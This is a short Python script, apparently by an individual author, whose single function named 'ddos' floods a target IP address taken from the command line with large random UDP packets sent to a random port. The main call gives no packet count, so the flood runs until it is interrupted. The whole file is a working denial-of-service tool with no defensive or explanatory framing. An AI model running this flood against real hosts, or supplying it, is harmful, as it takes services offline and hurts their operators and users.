#!/usr/bin/env python3
# coding=utf-8
# date 2018-03-08 17:36:59
# author calllivecn <c-all@qq.com>


import sys
import os
import random
from socket import socket, AF_INET, SOCK_DGRAM


def ddos(TARGET, count=False):

    data = os.urandom(65000)

    port = random.randint(2500, 65000)

    s = socket(AF_INET, SOCK_DGRAM)

    if count:
        for i in range(count):
            s.sendto(data, (TARGET, port))
    else:
        while True:
            s.sendto(data, (TARGET, port))

    s.close()


dst_ip = sys.argv[1]

try:
    ddos(dst_ip)
except KeyboardInterrupt:
    pass
